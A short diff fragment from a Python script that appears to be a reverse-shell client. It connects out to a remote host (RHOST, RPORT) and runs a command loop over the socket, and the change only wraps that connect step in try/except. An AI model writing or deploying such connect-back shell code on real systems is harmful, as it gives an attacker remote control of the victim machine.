@@ -175,9 +175,9 @@ def shell(handler=handler):
                 unicorn.send((E+"Unrecognized command!").encode())
     sys.exit()
 
-#try:
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((RHOST, RPORT))
-shell()
-#except Exception:
-#    sys.exit()
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((RHOST, RPORT))
+    shell()
+except Exception:
+    sys.exit()
